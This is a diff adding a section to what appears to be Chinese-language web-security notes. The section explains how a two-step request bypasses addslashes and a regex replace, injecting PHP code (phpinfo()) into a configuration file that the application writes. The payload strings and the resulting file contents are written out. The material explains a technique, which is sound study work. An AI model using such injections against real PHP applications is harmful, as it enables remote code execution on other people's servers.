@@ -20,6 +20,36 @@ $option='test';
 场景： 用于写入配置文件等。
 
 ## 法一
+先访问：
+```
+?option=aaa';%0aphpinfo();//
+```
+经过addslashes后，$str值为 `aaa\';%0aphpinfo();//`
+
+进行正则匹配并写入文件，xxxxx/option.php的内容变为:
+```php
+<?php 
+$option='aaa\';
+phpinfo();//';
+?>
+```
+
+再访问：
+```
+?option=xxx
+```
+正则匹配时，会将两个单引号里的内容即 `aaa\` ，替换为 `xxx`，此时xxxxx/option.php的内容变为
+```php 
+<?php
+$option='xxx';
+phpinfo();//';
+?>
+```
+
+访问：/xxxxx/option.php
+
+## 法二
+
 
 # Refference 
 + p神的小秘圈
